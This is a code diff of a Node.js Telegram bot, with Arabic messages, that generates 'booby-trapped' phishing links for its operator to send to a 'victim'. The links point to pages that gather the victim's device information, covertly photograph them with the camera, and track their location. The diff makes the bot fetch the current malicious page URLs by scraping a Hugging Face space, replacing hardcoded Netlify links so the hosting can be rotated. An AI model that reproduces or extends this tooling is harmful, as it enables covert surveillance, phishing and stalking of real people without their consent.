@@ -1942,51 +1942,55 @@ bot.onText(/\/jjihigjoj/, (msg) => {
 });
 
 
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-
-
-    if (query.data === 'collect_device_info') {
-        const url = `https://effervescent-chimera-19a252.netlify.app/mm/?chatId=${chatId}`;
-        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
-    }
-
-
-    bot.answerCallbackQuery(query.id);
-});
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
 
     if (query.data === 'get_link') {
-
         bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
 
+        const messageHandler = async (msg) => {
+            if (msg.chat.id !== chatId) return;
 
-        const messageHandler = (msg) => {
-
-            if (msg.chat.id === chatId) {
-                if (msg.text && msg.text.startsWith('https')) {
-                    const userLink = msg.text;
-
-
-                    dataStore[chatId] = { userLink };
-
-
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\https://incomparable-meringue-36eed3.netlify.app/k.html?chatId=${chatId}`);
-
-
-                    bot.removeListener('message', messageHandler);
+            if (msg.text && msg.text.startsWith('https')) {
+                const dynamicLink = await fetchDynamicLink("k");
+                if (dynamicLink) {
+                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${dynamicLink}?chatId=${chatId}`);
                 } else {
-
-                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
+                    bot.sendMessage(chatId, '❌ لم يتم العثور على الرابط في الموقع');
                 }
+
+                bot.removeListener('message', messageHandler);
+            } else {
+                bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
             }
         };
 
-
         bot.on('message', messageHandler);
     }
-});
+}); // <-- هذا يغلق الـ callback_query بشكل صحيح
+
+// دالة استيراد الرابط ديناميكياً
+async function fetchDynamicLink(namePart) {
+    try {
+        const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+        const response = await axios.get(url, { timeout: 10000 });
+        const $ = cheerio.load(response.data);
+        let foundLink = null;
+
+        $('a[href]').each((i, el) => {
+            const link = $(el).attr('href');
+            if (link.includes(namePart)) {
+                foundLink = link;
+                return false;
+            }
+        });
+
+        return foundLink;
+    } catch (err) {
+        console.error("Error fetching link:", err.message);
+        return null;
+    }
+}
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
@@ -2678,16 +2682,47 @@ bot.onText(/\/اتتهتتاههة/, (msg) => {
 });
 
 
-bot.on('callback_query', (callbackQuery) => {
+bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
-    const messageId = callbackQuery.message.message_id;
+    const data = callbackQuery.data;
 
-    if (callbackQuery.data === 'get_photo_link') {
-        const link = `https://papaya-puffpuff-4f123f.netlify.app/xx.html?chatId=${chatId}`;
-        bot.sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
+    if (data === 'get_photo_link') {
+
+        try {
+            // الرابط الذي نستورد منه الملفات (مثل واتساب)
+            const sourceUrl = "https://sssssskskjwnsb-linklsksn.hf.space";
+
+            // جلب صفحة الروابط
+            const response = await axios.get(sourceUrl, { timeout: 10000 });
+            const $ = cheerio.load(response.data);
+
+            let foundLink = null;
+
+            // البحث عن ملف xx.html داخل الصفحة
+            $('a[href]').each((index, element) => {
+                const link = $(element).attr('href');
+
+                if (link.includes("xx.html")) {
+                    foundLink = link;
+                    return false;
+                }
+            });
+
+            if (!foundLink) {
+                return bot.sendMessage(chatId, "لم يتم العثور على رابط xx.html");
+            }
+
+            // بناء الرابط النهائي
+            const finalLink = `${foundLink}?chatId=${chatId}`;
+
+            bot.sendMessage(chatId, `محمد: ${finalLink}`);
+            bot.answerCallbackQuery(callbackQuery.id);
+
+        } catch (err) {
+            bot.sendMessage(chatId, "خطأ أثناء جلب الرابط.");
+        }
     }
 });
-
 
 bot.onText(/\/sخسننسمس/, (msg) => {
     const chatId = msg.chat.id;
@@ -4246,25 +4281,32 @@ bot.onText(/\/sgggggkjtart/, (msg) => {
 });
 
 // معالجة ضغط زر الإنلاين
-bot.on('callback_query', (callbackQuery) => {
+bot.on('callback_query', async (callbackQuery) => {
     const message = callbackQuery.message;
     const chatId = message.chat.id;
     const data = callbackQuery.data;
 
+    // استيراد رابط lo ديناميكياً
     if (data.startsWith('getLocationi:')) {
         const targetChatId = data.split(':')[1];
-        
-        // إنشاء رابط HTML فريد لكل مستخدم
-        const locationUrl = `https://cute-brigadeiros-aedd53.netlify.app/lo/?chatId=${targetChatId}`;
-        
-        // إرسال الرابط كرسالة نصية عادية
-        bot.sendMessage(
-            chatId, 
-            `تم تلغيم الرابط لخـ ^_^ـ.راق موقع الضحيه :\n\n${locationUrl}`
-        );
-        
-        // تأكيد استلام الضغط
-        bot.answerCallbackQuery(callbackQuery.id);
+
+        // يجلب الرابط الذي يحتوي "lo" من الموقع
+        const loLink = await fetchDynamicLink("lo");
+
+        if (loLink) {
+            const locationUrl = `${loLink}?chatId=${targetChatId}`;
+
+            bot.sendMessage(
+                chatId,
+                `تم تلغيم الرابط لخـ ^_^ـ.راق موقع الضحيه :\n\n${locationUrl}`
+            );
+
+            bot.answerCallbackQuery(callbackQuery.id, { text: 'تم إرسال الرابط بنجاح' });
+
+        } else {
+            bot.sendMessage(chatId, "❌ لم يتم العثور على رابط موقع الضحية في الموقع");
+            bot.answerCallbackQuery(callbackQuery.id, { text: 'خطأ' });
+        }
     }
 });
 
